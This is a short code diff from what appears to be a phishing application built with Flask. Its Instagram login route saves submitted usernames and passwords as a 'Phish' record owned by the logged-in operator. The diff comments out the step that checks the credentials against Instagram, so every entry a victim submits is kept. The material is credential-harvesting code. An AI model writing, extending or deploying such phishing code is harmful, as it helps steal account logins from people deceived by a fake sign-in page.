@@ -11,11 +11,11 @@ def ig_login():
     elif request.method == 'POST':
         data = request.form.to_dict()
         loader = instaloader.Instaloader()
-        try:
-            loader.login(data["username"], data["password"])
-        except Exception as e:
-            print('###############################' + str(e))
-            return render_template("ig_login.html", error="Invalid login")
+        # try:
+        #     loader.login(data["username"], data["password"])
+        # except Exception as e:
+        #     print('###############################' + str(e))
+        #     return render_template("ig_login.html", error="Invalid login")
         
         user_phished = Phish(platform='Instagram',
                              owner=session["curr"],
